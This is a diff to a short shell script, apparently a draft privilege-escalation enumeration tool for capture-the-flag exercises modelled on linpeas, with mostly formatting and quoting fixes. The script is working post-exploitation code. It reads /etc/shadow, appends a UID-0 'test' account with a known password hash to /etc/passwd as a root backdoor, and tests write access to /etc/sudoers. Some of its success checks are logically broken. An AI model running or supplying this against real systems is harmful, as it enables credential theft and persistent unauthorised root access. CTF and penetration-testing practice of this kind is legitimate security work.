@@ -4,24 +4,24 @@
 # a terrible script for easy CTFs inspired by linpeas
 # draft, may contain typos
 
-hostname -f  > /tmp/info.txt
+hostname -f > /tmp/info.txt
 ip a >> /tmp/info.txt
 uname -a >> /tmp/info.txt
 echo '------------------------------------------------------------------------------' >> /tmp/info.txt
-echo 'OPEN PORTS'  >> /tmp/info.txt
+echo 'LISTEN PORTS' >> /tmp/info.txt
 netstat -lntu >> /tmp/info.txt
 echo '------------------------------------------------------------------------------' >> /tmp/info.txt
 echo 'PIVOTING?' >> /tmp/info.txt
 ip neighbour show >> /tmp/info.txt
 echo '------------------------------------------------------------------------------' >> /tmp/info.txt
-echo 'SHADOW?'  >> /tmp/info.txt
+echo 'SHADOW?' >> /tmp/info.txt
 cat /etc/shadow || echo 'can not cat shadow file' >> /tmp/info.txt
 echo '------------------------------------------------------------------------------' >> /tmp/info.txt
 echo 'WRITE PASSWD?' >> /tmp/info.txt
-cat 'test: $6$52450745$k5ka2p8bFuSmoVT1tzOyyuaREkkKBcCNqoDKzYiJL9RaE8yMnPgh2XzzF0NDrUhgrcLwg78xs1w5pJiypEdFX/:5000:0::/root:/bin/bash >> /etc/passwd && echo 'yup – password = hashcat user = test' | echo 'nope' >> /tmp/info.txt 
+echo 'test:$6$52450745$k5ka2p8bFuSmoVT1tzOyyuaREkkKBcCNqoDKzYiJL9RaE8yMnPgh2XzzF0NDrUhgrcLwg78xs1w5pJiypEdFX/:5000:0::/root:/bin/bash' >> /etc/passwd && echo 'yup – password = hashcat user = test' | echo 'nope' >> /tmp/info.txt 
 echo '------------------------------------------------------------------------------' >> /tmp/info.txt
 echo 'WRITE SUDOERS FILE?' >> /tmp/info.txt
-echo #test >> /etc/sudoers && echo 'yup' >> /tmp/info.txt | echo 'nope' >> /tmp/info.txt
+echo '#test' >> /etc/sudoers && echo 'yup' >> /tmp/info.txt | echo 'nope' >> /tmp/info.txt
 echo '------------------------------------------------------------------------------' >> /tmp/info.txt
 echo 'LIST OF USERS' >> /tmp/info.txt
 awk -F: '$3 >= 1000 && $3 <= 60000' /etc/passwd | grep -v nobody >> /tmp/info.txt
